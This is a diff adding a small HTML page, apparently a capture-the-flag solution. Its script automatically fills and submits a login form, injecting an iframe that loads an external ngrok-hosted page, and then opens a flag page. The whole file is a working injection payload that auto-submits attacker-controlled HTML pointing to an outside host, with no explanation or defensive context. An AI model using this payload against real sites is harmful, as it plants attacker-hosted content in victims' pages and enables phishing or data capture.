@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>x</title>
+</head>
+<body>
+
+<form method="POST" id="credForm">
+	<input name="username" type="text" id="usernameField">
+	<input name="password" type="password" id="passwordField">
+	<input name="submit" type="submit">
+</form>
+
+<template id="extHtml">
+	<div>
+		<iframe name="shadowframe" src="https://c50e-109-156-209-195.ngrok-free.app"></iframe>
+	</div>
+</template>
+
+<script>
+// write html
+
+usernameField.value = extHtml.content.firstElementChild.innerHTML;
+passwordField.value = "lol";
+
+setTimeout(() => usernameField.dispatchEvent(new Event("change")), 350);
+setTimeout(() => credForm.dispatchEvent(new Event("submit")), 650);
+
+setTimeout(() => open("/flag2.html"), 1000);
+
+</script>
+
+</body>
+</html>
